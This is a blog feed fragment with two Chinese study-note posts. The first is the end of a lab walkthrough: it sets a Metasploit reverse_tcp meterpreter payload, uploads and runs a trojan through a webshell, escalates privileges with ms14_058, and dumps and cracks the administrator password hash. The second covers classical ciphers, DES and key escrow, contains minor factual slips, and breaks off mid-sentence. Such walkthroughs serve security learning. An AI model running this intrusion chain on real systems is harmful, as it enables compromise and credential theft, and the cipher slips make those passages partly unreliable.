class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST &lt;靶机IP&gt;</span><br><span class="line"><span class="built_in">set</span> LPORT 6666</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/11/06/9zgmlPdetZsCfGH.png" alt="15.png"></p></li></ul><p> <strong>将木马的exe文件从kali复制到主机，然后上传到蚁剑对应位置</strong></p><blockquote><p>（进入&#x2F;web&#x2F;upfile&#x2F;affix&#x2F;，右键上传）</p></blockquote><p><img src="https://s2.loli.net/2024/11/06/B8vSMlg4dXVpGsE.png" alt="16.png"></p><ul><li><p><strong>启动木马文件</strong>：</p><blockquote><p>右键⽊⻢⽂件，打开终端 输⼊如下命令 </p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> 123.exe</span><br></pre></td></tr></table></figure><blockquote><p>如果成功，Kali 会成功上线（回到kali终端查看）。</p></blockquote><p><img src="https://s2.loli.net/2024/11/06/4eorftv6HnB2cOE.png" alt="17.png"></p><blockquote><p>发现kali成功上线后 可查看到run的执⾏结果（如下图） </p></blockquote><p><img src="https://s2.loli.net/2024/11/06/sypAoLET8I5rSOe.png" alt="18.png"></p><blockquote><p>它⾃动的为我们匹配出了⼀些可能的⽤于易受攻击⽬标提权的漏洞利⽤模块</p></blockquote></li></ul><h2 id="9-提权操作"><a href="#9-提权操作" class="headerlink" title="9. 提权操作"></a>9. 提权操作</h2><ul><li><p>使用以下命令检查提权模块：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">bg</span></span><br><span class="line">sessions</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/11/06/yKlRjuSf4AieIZG.png" alt="19.png"></p></li><li><p><strong>提权操作</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use multi/recon/local_exploit_suggester</span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://s2.loli.net/2024/11/06/jw1dgqrkM6vGfKQ.png" alt="20.png"></p><ul><li><p>搜索并利用提权漏洞：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search ms14_058</span><br><span class="line">use exploit/windows/local/ms14_058_track_popup_menu</span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/11/06/Q1njzmoOYVRHAli.png" alt="21.png"></p></li><li><p><strong>检查权限</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getuid</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/11/06/qz1U6ZSgwWohAct.png" alt="22.png"></p></li></ul><blockquote><p>发现已经是最高权限</p></blockquote><h2 id="10-持久化攻击"><a href="#10-持久化攻击" class="headerlink" title="10. 持久化攻击"></a>10. 持久化攻击</h2><ul><li>获取 <code>administrator</code> 密码：<ul><li>使用 <code>hashdump</code> 模块提取密码 hash。<br><img src="https://s2.loli.net/2024/11/06/HlzGqJRjFn2x6pD.png" alt="23.png"><br><img src="https://s2.loli.net/2024/11/06/fOcRn4DyW9VLjsE.png" alt="24.png"><blockquote><p>已经可以看到相关账户密码加密后的hash了 </p></blockquote></li><li>将 hash 上传至 <a href="https://www.cmd5.com/">cmd5.com</a> 进行解密，得到密码为 <code>admin123</code>。<br><img src="https://s2.loli.net/2024/11/06/SCmG1Bs2thUEuVy.png" alt="25.png"></li></ul></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>区块链安全基础一</title>
      <link href="/2024/10/30/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
      <url>/2024/10/30/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h5 id="关键词：信息安全-网络安全-（非）对称加密-密钥管理技术"><a href="#关键词：信息安全-网络安全-（非）对称加密-密钥管理技术" class="headerlink" title="关键词：信息安全  网络安全  （非）对称加密   密钥管理技术"></a>关键词：信息安全  网络安全  （非）对称加密   密钥管理技术</h5><h2 id="一-信息安全知识基础"><a href="#一-信息安全知识基础" class="headerlink" title="一. 信息安全知识基础"></a>一. 信息安全知识基础</h2><h3 id="1-1-信息安全定义-特征"><a href="#1-1-信息安全定义-特征" class="headerlink" title="1.1 信息安全定义&amp;特征"></a>1.1 信息安全定义&amp;特征</h3><h4 id="1-1-1信息安全的定义："><a href="#1-1-1信息安全的定义：" class="headerlink" title="1.1.1信息安全的定义："></a>1.1.1信息安全的定义：</h4><p>​a. 信息系统的安全（也称实体安全，系统运行的安全）</p><p>​b. 特定信息体系的安全</p><ul><li>系统中信息的安全（用户权限的限制，数据加密）</li><li>管理安全（对信息资源和系统运行的管理）</li></ul><h4 id="1-1-2信息安全的特征"><a href="#1-1-2信息安全的特征" class="headerlink" title="1.1.2信息安全的特征"></a><span style="color: red;">1.1.2信息安全的特征</span></h4><p><strong>a. 保密性</strong></p><p><strong>b. 完整性</strong></p><p><strong>c. 可用性</strong></p><p><strong>d. 可控性</strong></p><p><strong>e. 可审查性</strong></p><h4 id="关于五种特征的解释："><a href="#关于五种特征的解释：" class="headerlink" title="关于五种特征的解释："></a>关于五种特征的解释：</h4><p>（1）保密性：保密性是指信息<span style="color: blue;">不泄漏给非授权的个人、实体和过程，或供其使用的特性。</span><br>（2）完整性：完整性是指信息<span style="color: blue;">未经授权不能被修改、不被破坏、不被插入、不延迟、不乱序和不丢失的特性。</span>对网络信息安全进行攻击其最终目的就是破坏信息的完整性。<br>（3） 可用性：可用性是指合法用户访问并能<span style="color: blue;">按要求顺序使用信息的特性</span>，即保证合法用户在需要时可以访问到信息及相关资产。<br>（4）可控性：可控性是指授权机构<span style="color: blue;">对信息的内容及传播具有控制能力的特性</span>，可以控制授权范围内的信息流向以及方式。<br>（5）可审查性（抗抵赖性）：在信息交流过程结束后，通信双方<span style="color: blue;">不能抵赖曾经做出的行为，也不能否认曾经接收到对方的信息。</span></p><h3 id="1-2-网络安全的定义-特征"><a href="#1-2-网络安全的定义-特征" class="headerlink" title="1.2 网络安全的定义&amp;特征"></a>1.2 网络安全的定义&amp;特征</h3><h5 id="1-2-1-网安定义"><a href="#1-2-1-网安定义" class="headerlink" title="1.2.1 网安定义"></a>1.2.1 网安定义</h5><p>a. 硬件安全</p><p>b. 软件安全</p><p>c.系统中数据的安全</p><h5 id="1-2-2网安特征"><a href="#1-2-2网安特征" class="headerlink" title="1.2.2网安特征"></a>1.2.2网安特征</h5><p>a.保密性</p><p>b.完整性</p><p>c.可用性</p><p>d.可控性</p><h3 id="1-3-网络信息安全技术需求"><a href="#1-3-网络信息安全技术需求" class="headerlink" title="1.3 网络信息安全技术需求"></a>1.3 网络信息安全技术需求</h3><h5 id="1-3-1-网络物理安全（实体安全）"><a href="#1-3-1-网络物理安全（实体安全）" class="headerlink" title="1.3.1 网络物理安全（实体安全）"></a>1.3.1 网络物理安全（实体安全）</h5><p>​指所有支持网络系统运行的硬件总体安全。</p><p>​物理安全的需求主要有：</p><ul><li>环境安全</li><li>设备安全（物理防备）</li><li>媒体安全（媒体数据&amp;媒体本身）</li></ul><h5 id="1-3-2网络认证"><a href="#1-3-2网络认证" class="headerlink" title="1.3.2网络认证"></a>1.3.2网络认证</h5><p>​定义：实现网络资源访问控制的前提和依据。</p><p>​作用：标识，鉴别网络资源访问者身份的真实性</p><h5 id="1-3-3-网络访问控制"><a href="#1-3-3-网络访问控制" class="headerlink" title="1.3.3 网络访问控制"></a>1.3.3 网络访问控制</h5><p>​网络访问控制是有效保护网络管理对象，使其免受关键技术方法。其目标主要有两个：<br>​（1）限制非法用户获取或使用网络资源。<br>​（2） 防止合法用户滥用权限，越权访问网络资源。</p><h5 id="1-3-4网络安全保密"><a href="#1-3-4网络安全保密" class="headerlink" title="1.3.4网络安全保密"></a>1.3.4网络安全保密</h5><p>​目的： 就是防止非授权的用户访问网上信息或网络设备。</p><p>​为此，重要的网络物理实体能够采用辐射干扰机技术，防止通过电磁辐射泄露机密信息。</p><h5 id="1-3-5网络安全监测"><a href="#1-3-5网络安全监测" class="headerlink" title="1.3.5网络安全监测"></a>1.3.5网络安全监测</h5><p>​作用： 发现系统入侵活动和检查安全保护措施的有效性，以便及时报警给网安管理员</p><h5 id="1-3-6网络漏洞评估"><a href="#1-3-6网络漏洞评估" class="headerlink" title="1.3.6网络漏洞评估"></a>1.3.6网络漏洞评估</h5><p>​作用： 扫描弱点&amp;漏洞</p><h5 id="1-3-7-防范网络恶意代码"><a href="#1-3-7-防范网络恶意代码" class="headerlink" title="1.3.7 防范网络恶意代码"></a>1.3.7 防范网络恶意代码</h5><h5 id="1-3-8-网络安全应急响应"><a href="#1-3-8-网络安全应急响应" class="headerlink" title="1.3.8 网络安全应急响应"></a>1.3.8 网络安全应急响应</h5><h5 id="1-3-9-网络安全体系"><a href="#1-3-9-网络安全体系" class="headerlink" title="1.3.9 网络安全体系"></a>1.3.9 网络安全体系</h5><p>​网络安全的实现不仅仅取决于某项技术，而是依赖于一个网络信息安全体系的建立，这个体系包括安全组织机构、安全制度、安全管理流程、安全人员意识等。通过安全体系的建立，可以在最大程度上实现网络的整体安全，满足企业或单位安全发展的要求。</p><h5 id="1-4-信息安全策略"><a href="#1-4-信息安全策略" class="headerlink" title="1.4 信息安全策略"></a>1.4 信息安全策略</h5><ul><li>物理安全</li><li>访问控制</li><li>防火墙</li><li>信息加密</li><li>网络安全管理</li></ul><h5 id="1-5-相关法律"><a href="#1-5-相关法律" class="headerlink" title="1.5 相关法律"></a>1.5 相关法律</h5><h2 id="二-密码学基础"><a href="#二-密码学基础" class="headerlink" title="二. 密码学基础"></a>二. 密码学基础</h2><h3 id="2-1-密码基本知识"><a href="#2-1-密码基本知识" class="headerlink" title="2.1 密码基本知识"></a>2.1 密码基本知识</h3><p><img src="https://s2.loli.net/2024/11/03/56aczxuvg3BOFyU.jpg" alt="1.jpg"></p><h3 id="2-2-古典密码体制"><a href="#2-2-古典密码体制" class="headerlink" title="2.2 古典密码体制"></a>2.2 古典密码体制</h3><h4 id="2-2-1-单表密码"><a href="#2-2-1-单表密码" class="headerlink" title="2.2.1 单表密码"></a>2.2.1 单表密码</h4><p>（仅个人兴趣列出 非必须掌握）</p><ul><li><strong>凯撒密码</strong></li></ul><p>该算法表示为： </p><p><img src="https://s2.loli.net/2024/11/03/lOFKSTxvZR8siun.jpg" alt="2.jpg"></p><p>（c代表密文，p代表明文）</p><ul><li><p><strong>仿射密码</strong></p><p>仿射密码的主要特点是使用一个线性函数进行加密和解密。</p><p>加密过程：</p><p>在仿射密码中，字符通过以下公式进行加密：</p><p>E(x)&#x3D;(ax+b) mod  m </p><ul><li><p>E(x)：加密后的字符</p></li><li><p>x：原字符在字母表中的位置（例如，A&#x3D;0，B&#x3D;1，C&#x3D;2，…，Z&#x3D;25）</p></li><li><p>a 和 b：密钥，其中 a必须与字母表的大小 m <strong>互质</strong></p></li><li><p>m：字母表的大小（例如，对于英文字母，m&#x3D;26）</p></li></ul><p>假设我们选择 a&#x3D;5 和 b&#x3D;8，加密字母 “C”：</p><ol><li><p>C 的位置 x&#x3D;2</p></li><li><p>加密：E(2)&#x3D;(5⋅2+8)mod  26&#x3D;18</p></li><li><p>对应字母为 “S”</p></li></ol></li><li><p><strong>乘法密码</strong></p><p>加密公式为：</p><p>E(x)&#x3D;(a⋅x)mod  m</p><ul><li>E(x)：加密后的字符</li><li>x：原字符在字母表中的位置（例如，A&#x3D;0，B&#x3D;1，C&#x3D;2，…，Z&#x3D;25）</li><li>a：密钥，且必须与字母表的大小 m 互质</li><li>m：字母表的大小（对于英文字母，m&#x3D;26）</li></ul></li><li><p><strong>密钥词组密码</strong></p></li></ul><h6 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h6><ol><li><h6 id="选择密钥词组：首先选择一个密钥词组，去掉重复字母并将字母的顺序保留。"><a href="#选择密钥词组：首先选择一个密钥词组，去掉重复字母并将字母的顺序保留。" class="headerlink" title="选择密钥词组：首先选择一个密钥词组，去掉重复字母并将字母的顺序保留。"></a><strong>选择密钥词组</strong>：首先选择一个密钥词组，去掉重复字母并将字母的顺序保留。</h6><p>例如，如果选择的密钥词组是 “SECURITY”，则变为 “SECURIT”（去掉重复的 “I”）。</p></li><li><h6 id="生成替代字母表：使用密钥词组的字母开头，后面跟上字母表中未在密钥词组中的字母。"><a href="#生成替代字母表：使用密钥词组的字母开头，后面跟上字母表中未在密钥词组中的字母。" class="headerlink" title="生成替代字母表：使用密钥词组的字母开头，后面跟上字母表中未在密钥词组中的字母。"></a><strong>生成替代字母表</strong>：使用密钥词组的字母开头，后面跟上字母表中未在密钥词组中的字母。</h6><ul><li><p>密钥字母：S E C U R I T</p></li><li><p>剩余字母：A B D F G H J K L M N O P Q V W X Y Z</p></li><li><p>生成的替代字母表：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">S</span> <span class="built_in">E</span> <span class="built_in">C</span> <span class="variable">U</span> <span class="variable">R</span> <span class="built_in">I</span> <span class="variable">T</span> <span class="variable">A</span> <span class="variable">B</span> <span class="built_in">D</span> <span class="variable">F</span> <span class="variable">G</span> <span class="variable">H</span> <span class="variable">J</span> <span class="built_in">K</span> <span class="variable">L</span> <span class="variable">M</span> <span class="built_in">N</span> <span class="built_in">O</span> <span class="variable">P</span> <span class="variable">Q</span> <span class="variable">V</span> <span class="variable">W</span> <span class="variable">X</span> <span class="variable">Y</span> <span class="variable">Z</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>加密文本</strong>：用原字母表的字母替换为替代字母表中的字母。</p></li></ol><h4 id="2-2-2-多表密码"><a href="#2-2-2-多表密码" class="headerlink" title="2.2.2 多表密码"></a>2.2.2 多表密码</h4><p>2.2.2.1<strong>普拉斐尔密码</strong></p><h6 id="加密过程-1"><a href="#加密过程-1" class="headerlink" title="加密过程"></a>加密过程</h6><ol><li><p><strong>选择密钥</strong>：选择一个密钥词（例如 “PLAYFAIR”），去掉重复字母并将其填入一个5x5的矩阵中。</p></li><li><p><strong>填充矩阵</strong>：在密钥的基础上，依次填入剩余字母（通常将 “I” 和 “J” 合并为一个字母，矩阵中只使用一个）。</p><p>例如，使用 “PLAYFAIR” 作为密钥，矩阵为：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">P</span> <span class="variable">L</span> <span class="variable">A</span> <span class="variable">Y</span> <span class="variable">F</span></span><br><span class="line"><span class="built_in">I</span> <span class="variable">R</span> <span class="variable">B</span> <span class="built_in">C</span> <span class="built_in">D</span></span><br><span class="line"><span class="built_in">E</span> <span class="variable">G</span> <span class="variable">H</span> <span class="built_in">K</span> <span class="variable">M</span></span><br><span class="line"><span class="built_in">N</span> <span class="built_in">O</span> <span class="variable">Q</span> <span class="variable">S</span> <span class="variable">T</span></span><br><span class="line"><span class="variable">U</span> <span class="variable">V</span> <span class="variable">W</span> <span class="variable">X</span> <span class="variable">Z</span></span><br></pre></td></tr></table></figure></li><li><p><strong>准备明文</strong>：将明文按两两分组。如果有重复的字母，插入一个填充字母（通常使用 “X”）。如果最后一组只有一个字母，则在其后添加一个填充字母。</p><p>例如，明文 “HELLO” 变为 “HE LL OX”（分组为 “HE”, “LX”, “OX”）。</p></li><li><p><strong>加密规则</strong>：</p><ul><li><strong>同列</strong>：如果两个字母在同一列中，则用其下方的字母替换（循环回到顶部）。</li><li><strong>同行</strong>：如果两个字母在同一行中，则用其右边的字母替换（循环回到左边）。</li><li><strong>不同行不列</strong>：如果两个字母在矩阵的不同位置，形成一个矩形，则用矩形的对角字母替换。</li></ul><p>例如，加密 “HE”：</p><ul><li>H(第3行第3列) 和 E(第3行第1列) 形成一个矩形，加密为 “BK”。</li></ul></li><li><p><strong>重复上述步骤</strong>：对所有分组进行加密。</p><h6 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h6><p>解密过程与加密过程相反，使用相同的矩阵和规则：</p><ul><li><strong>同列</strong>：用上方的字母替换。</li><li><strong>同行</strong>：用左边的字母替换。</li><li><strong>不同行不列</strong>：用矩形的对角字母替换。</li></ul></li></ol><p>2.2.2.2 <strong>维吉尼亚密码</strong></p><h6 id="加密过程-2"><a href="#加密过程-2" class="headerlink" title="加密过程"></a>加密过程</h6><ol><li><p><strong>选择关键词</strong>：选择一个关键词（例如 “KEY”），并将其重复直到与明文长度相同。</p></li><li><p><strong>明文和关键词对齐</strong>：将明文与关键词字符逐一对齐。</p><p>例如，明文为 “HELLO WORLD”，关键词为 “KEY”，对齐后：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">H</span> <span class="built_in">E</span> <span class="variable">L</span> <span class="variable">L</span> <span class="built_in">O</span>   <span class="variable">W</span> <span class="built_in">O</span> <span class="variable">R</span> <span class="variable">L</span> <span class="built_in">D</span></span><br><span class="line"><span class="built_in">K</span> <span class="built_in">E</span> <span class="variable">Y</span> <span class="built_in">K</span> <span class="built_in">E</span>   <span class="built_in">K</span> <span class="built_in">E</span> <span class="variable">Y</span> <span class="built_in">K</span> <span class="built_in">E</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/11/03/bHRra7AINk1tPdD.png" alt="3.png"></p></li></ol><h6 id="解密过程-1"><a href="#解密过程-1" class="headerlink" title="解密过程"></a>解密过程</h6><p>解密过程与加密过程相似，但公式反转：</p><p><img src="https://s2.loli.net/2024/11/03/q1U9GD8TaLpnvcu.png" alt="4.png"></p><h6 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h6><p>假设明文为 “HELLO WORLD”，关键词为 “KEY”：</p><ol><li><strong>重复关键词</strong>：将 “KEY” 重复，得到 “KEYKEYKEYK”。</li><li><strong>对齐并加密</strong>：<ul><li>H (7) + K (10) &#x3D; R (17)</li><li>E (4) + E (4) &#x3D; I (8)</li><li>L (11) + Y (24) &#x3D; J (9)</li><li>L (11) + K (10) &#x3D; V (21)</li><li>O (14) + E (4) &#x3D; S (18)</li><li>空格不加密</li><li>W (22) + K (10) &#x3D; G (6)</li><li>O (14) + E (4) &#x3D; S (18)</li><li>R (17) + Y (24) &#x3D; P (15)</li><li>L (11) + K (10) &#x3D; V (21)</li><li>D (3) + E (4) &#x3D; H (7)</li></ul></li></ol><p>最终加密结果为 “RIJVS GSPVH”。</p><p>2.2.2.3 <strong>希尔密码</strong></p><p><img src="https://s2.loli.net/2024/11/03/Cq2mW3LQolaReDz.png" alt="5.png"></p><h3 id="2-3-现代密码体制"><a href="#2-3-现代密码体制" class="headerlink" title="2.3 现代密码体制"></a>2.3 现代密码体制</h3><h4 id="2-3-1-对称密码体制"><a href="#2-3-1-对称密码体制" class="headerlink" title="2.3.1 对称密码体制"></a>2.3.1 对称密码体制</h4><p>加密解密用同一把密钥 or 两把密钥之间可以推理出来</p><p><span style = "color: red;">对称加密算法的优点：</span></p><ol><li><span style = "color: red;">加，解密处理速度快</span></li><li><span style = "color: red;">保密度高</span></li></ol><p><span style = "color: red;">对称加密算法的缺点：</span></p><ol><li><span style = "color: red;">密钥分发困难</span></li><li><span style = "color: red;">密钥管理困难</span></li></ol><p><strong>举例：</strong></p><p>数据加密标准(DES)算法：</p><p><img src="https://s2.loli.net/2024/11/03/N4viyfzdRVm5ehU.jpg" alt="6.jpg"></p><p><img src="https://s2.loli.net/2024/11/03/71Kphrfctyk2iWJ.jpg" alt="7.jpg"></p><p>DES算法特点：<br>（1）分组加密算法：以64位为分组，64位一组明文输入，<br>64位密文输出。<br>（2） 对称算法：加密和解密用同一密钥。<br>（3）有效密钥长度为56位：密钥通常表示为64位数，但每个第8位都用作奇偶校验，可以忽略。<br>（4）代替和置换：DES算法是两种加密技术的组合，先代替后置换。<br>（5） 易于实现：DES算法只是使用了标准的算术和逻辑运算，其作用的数最多也只有64位，并且，算法的重复特性使得它可以非常理想地在一个专用芯片中实现</p><p><strong><span style = "color: orange;">2.3.2 非对称密码体制</span></strong></p><p>加密解密用不同密钥 or 两把密钥之间很难推理出来</p><p><span style = "color: red;">非对称加密算法的优点：</span></p><pre><code> 1. &lt;span style = &quot;color: red;&quot;&gt;密钥分发简单&lt;/span&gt; 2. &lt;span style = &quot;color: red;&quot;&gt;密钥管理便捷&lt;/span&gt; 3. &lt;span style = &quot;color: red;&quot;&gt;可以实现签名&lt;/span&gt;</code></pre><p><span style = "color: red;">非对称加密算法的缺点：</span></p><ol><li><span style = "color: red;">加密解密处理速度较慢</span></li><li><span style = "color: red;">同等安全强度下公钥密码体制的密钥位数要求多一些</span></li></ol><p><strong>举例：</strong></p><ul><li>RSA密钥生成原理</li><li>EIGamal公钥密码技术</li><li>椭圆曲线密码技术</li></ul><p>[具体解释等如果到时候我再遇到就去查了补充在这里QwQ]</p><h2 id="三-密钥管理技术"><a href="#三-密钥管理技术" class="headerlink" title="三.密钥管理技术"></a>三.密钥管理技术</h2><p><img src="https://s2.loli.net/2024/11/03/fAnc8R6hPg4VpGx.png" alt="8.png"></p><p><strong>一个完整的保密通信系统</strong></p><p>由</p><ol><li><p>密码体制（密码算法，及所有的明文，密文和密钥）</p></li><li><p>信源</p></li><li><p>信宿</p></li><li><p>攻击者</p></li></ol><p>构成。</p><p>  加解密算法一般都是公开的，所有的密码技术都依赖于密钥。当密码算法确定后，密码系统的保密程度就完全取决于密钥的保密程度。</p><p><strong>密钥管理定义</strong></p><p>密钥管理涉及密钥的产生和存储、分发、使用、更新（替换）、备份和恢复、以及撤销和销毁等，涵盖了密钥的整个生存周期。</p><h5 id="密钥管理目的"><a href="#密钥管理目的" class="headerlink" title="密钥管理目的"></a><strong>密钥管理目的</strong></h5><ol><li>确保密钥的安全性</li><li>确保密钥的有效性</li><li>密钥的分发和分享</li><li>密钥的更新和轮换</li><li>密钥的备份和恢复</li><li>监控和审计</li></ol><h3 id="3-1-密钥的类型和组织结构"><a href="#3-1-密钥的类型和组织结构" class="headerlink" title="3.1 密钥的类型和组织结构"></a>3.1 密钥的类型和组织结构</h3><h4 id="3-1-1-关于密钥长度"><a href="#3-1-1-关于密钥长度" class="headerlink" title="3.1.1 关于密钥长度"></a>3.1.1 关于密钥长度</h4><p>​密钥是安全通信的必要长度之一</p><p>长度决定因素：</p><ol><li>数据价值</li><li>所需安全期</li><li>攻击者资源情况</li><li>计算机计算能力</li><li>加密算法的发展</li></ol><h4 id="3-1-2密钥的产生与存储"><a href="#3-1-2密钥的产生与存储" class="headerlink" title="3.1.2密钥的产生与存储"></a>3.1.2密钥的产生与存储</h4><p>产生与生成算法有关：大部分采用随机或伪随机过程</p><p>存储：有无介质，记录介质，物理介质等几种</p><h4 id="3-1-3密钥的使用-更新（替换）"><a href="#3-1-3密钥的使用-更新（替换）" class="headerlink" title="3.1.3密钥的使用&amp;更新（替换）"></a>3.1.3密钥的使用&amp;更新（替换）</h4><p>密钥的使用是指从存储介质上获得密钥，进行加密和解密的技术活动。</p><p>密钥的更新和替换是指定期更换密钥，以增强系统的安全性和保护密钥的长期有效性</p><h4 id="3-1-4密钥的备份与恢复"><a href="#3-1-4密钥的备份与恢复" class="headerlink" title="3.1.4密钥的备份与恢复"></a>3.1.4密钥的备份与恢复</h4><p>备份：在密钥使用期内，存储一个受保护的拷贝，用于恢复遭到破坏的密钥</p><p>恢复：当一个密钥由于某种原因被破坏了，在还没有泄露出去以前，从它的一个备份重新得到密钥的过程 </p><h4 id="3-1-5密钥的销毁和撤销"><a href="#3-1-5密钥的销毁和撤销" class="headerlink" title="3.1.5密钥的销毁和撤销"></a>3.1.5密钥的销毁和撤销</h4><p>销毁：一般针对公钥证书所对应的密钥，撤销后密钥不再具备使用效力。</p><p><strong>自然撤销：当证书到期时</strong></p><p><strong>按需撤销</strong></p><p>密钥更换后，原来的密钥必须销毁。密钥不再使用时，该密钥所有的拷贝都必须删除，生成或构造该密钥的所有信息也应该被全部删除。</p><h3 id="3-2-密钥托管技术"><a href="#3-2-密钥托管技术" class="headerlink" title="3.2 密钥托管技术"></a>3.2 密钥托管技术</h3><p><strong>定义</strong>：提供一种密钥备份与恢复的途径，也称为托管加密</p><p><strong>实现手段</strong>：把加密的数据和数据恢复密钥联系起来，通过一个防窜扰的托管加密芯片（Clipper芯片）来实现，该技术包括两个主要的核心内容：</p><ul><li>skipjack加密算法</li><li>LEAF</li></ul><p>密钥托管技术在具体实施时有<strong>三个主要环节</strong>：生产托管Clipper芯片、用芯片加密通信、无密钥存取</p><p><strong>技术组成</strong>：USC  KEC  DRC</p><p>（这几个模块的相互关系：这几个模块的相互 关系：USC用密钥K加密明文，并且在传送的同时传送一个数据 恢复域DRF（Data Recovery Field）， DRC则从KEC提供的和DRF 中包含的信息中恢复出密钥K来解密密文。）</p><p><img src="https://s2.loli.net/2024/11/03/B2UZmvDspiuQwPE.jpg" alt="9.jpg"></p><p><strong>1.USC</strong>：<br>(1)USC: USC由软件、硬件组成(一般情况下，硬件比 软件安全、不易发生窜扰)，提供数据加密&#x2F;解密的能力，执 行支持数据恢复的操作，同时也支持密钥托管。这种支持体 <span style = "color: blue;">现在将数据恢复域(DRF)附加到数据上</span>。</p><p>USC的功能表现在以下几个方面:<br>1 提供具有数据加解密能力的算法及支持密钥托管功能的硬 件或相关软件。<br>2 提供通信(包括电话、电子邮件及其他类型的通信，由相 关部⻔在法律许可的条件下对通信的监听后执行对突发事件 的解密)和数据存储的密钥托管。<br>3 提供突发解密的识别符(包括用户或USC的识别符、密钥 的识别符、KEC或托管代理机构的识别符)和密钥(包括属 于芯片单元密钥KEC所使用的全局系统密钥，密钥还可以是 公钥或私钥，私钥的备份以托管的方式有托管机构托管)。</p><p><strong>2.KEC</strong>：<br>(2)KEC:可以作为公钥证书密钥管理系统的组成部分，也 可以作为<span style = "color: blue;">通用密钥管理的基础部分</span>。它由密钥管理机构控制， 主要用于向DRC提供所需的数据和服务，管理着<span style = "color: blue;">数据恢复密钥 的存储、传送和使用</span>。数据恢复密钥主要用于生成数据加密密 钥，因此在使用托管密码加密时，<span style = "color: blue;">所有的托管加密数据都应与 被托管的数据恢复密钥联系起来</span>。</p><p>数据恢复密钥主要由以下内容组成:</p><ul><li><p>密钥选项</p></li><li><p>密钥分割</p></li><li><p>密钥的产生和分配</p></li><li><p>密钥托管时间</p></li><li><p>密钥更新</p></li><li><p>密钥的全部和部分</p></li><li><p>密钥存储</p></li></ul><p>KEC在向DRC提供诸如托管的密钥等服务时，服务包括:<br>1 <span style = "color: blue;">授权过程</span>:对操作或使用DRC的用户进行身份认证和对访问 加密数据的授权证明。<br>2 传送数据恢复密钥(主密钥不提供):如果数据恢复密钥是 会话密钥或产品密钥，KEC向DRC直接传送数据恢复密钥。密 钥传送时和有效期一起传送，有效期过后，密钥将被自动销 毁。<br>3 传送派生密钥:KEC向DRC提供由数据恢复密钥导出的另一 密钥(派生密钥)。比如受时间限制的密钥，被加密的数据仅 能在一个特定的有效时间段内被解密。<br>4 解密密钥:如果在DRF中使用主密钥加密数据加密密钥 时，KEC只向DRC发送解密密钥，而不发送主密钥。<br>5 执行⻔限解密:每个托管机构向DRC提供自己的解密结 果，由DRC合成这些结果并得到明文。 6数据传输:KEC和DRC之间的数据传输可以是人工的也 可以是电子的。</p><p><strong>3.DRC</strong><br>(3)DRC:由算法、协议和设备组成。DRC利用KEC所提 供的和在DRF中包含的信息中<span style = "color: blue;">恢复出数据加密密钥</span>，进而解 密密文，得到明文。仅仅在执行指定的已授权的数据恢复时 使用。<br>为了解密数据，要获得数据加密密钥， DRC必须采用下列方 法来获得数据加密密钥:<br>(1)从发送方S或接收方R接入:<br>(2)与KEC交互<br>(3)穷举搜索</p><p>(1)<span style = "color: blue;">从发送方S或接收方R接入:</span></p><p>首先要确定与S或R相关的数据恢复密钥能否恢复密钥K。如果只 能利用S的托管机构持有的子密钥才能获得K，当各个用户分别向专 ⻔的用户传送消息，尤其是在多个用户散布在不同的国家或使用不 同的托管机构时，DRC一定得获取密钥托管数据后才能进行实时解 密，这是有困难的;同样，当只有利用R的托管机构所持的子密钥才 能获得K时，也不可能实时解密专⻔用户传送出的消息。如果利用托 管机构的子集所持的密钥可以进行数据恢复，那么一旦获得了K，则 DRC就可以实时解密从USC发出或送入的消息。该系统就可以为双 向实时通信提供这种能力，但这要求通信双方使用相同的K。</p><p>(2)<span style = "color: blue;">与KEC交互 </span></p><p>对于每个数据加密密钥，S或R都有可能要求DRC或KEC有一次相互作用，其中对数据加密密钥要求DRC与KEC之间的联系是 在线的，以支持当每次会话密钥改变时的实时解密。</p><p>(3)<span style = "color: blue;">穷举搜索 </span></p><p>当托管代理机构把部分密钥返回给DRC时，DRC必须使用穷举搜索以确定密钥的其余部分。<br>DRC还使用技术、操作和法律等保护手段来控制什么是可以解 